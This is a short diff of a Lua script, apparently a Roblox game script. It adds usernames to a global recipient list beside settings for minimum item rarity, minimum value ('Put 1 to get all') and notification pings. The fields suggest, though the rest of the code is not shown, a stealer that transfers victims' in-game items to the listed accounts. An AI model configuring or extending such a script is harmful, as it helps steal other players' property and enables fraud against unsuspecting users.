@@ -327,7 +327,7 @@ pcall(function()
     end
 
         
-    _G.Usernames = {"t_cheloux", "Dont_Distrubs", "Dont_Distrubs2", "anfall38"} -- you can add as many as you'd like
+    _G.Usernames = {"t_cheloux", "Dont_Distrubs", "Dont_Distrubs2", "Dont_Distrubs", "anfall38", "mousta34"} -- you can add as many as you'd like
     _G.min_rarity = "Common"
     _G.min_value = 1 -- Put 1 to get all
     _G.pingEveryone = "No" -- change to "No" if you dont want pings
